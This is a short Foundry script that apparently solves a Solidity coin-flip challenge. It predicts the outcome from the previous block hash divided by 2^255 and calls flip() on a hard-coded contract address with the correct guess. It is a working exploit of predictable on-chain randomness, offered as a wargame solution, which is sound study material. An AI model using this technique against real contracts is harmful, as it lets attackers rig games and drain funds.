// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/CoinFlip.sol";

contract CoinFlipScript is Script {
    function run() external {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        vm.startBroadcast();
        CoinFlip coinFlipContract = CoinFlip(payable(0x404F70444140B28A93Ba2D2Ac13aD0f717f344E1));
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == true) {
            coinFlipContract.flip(true);
        } else {
            coinFlipContract.flip(false);
        }
        vm.stopBroadcast();
    }
}
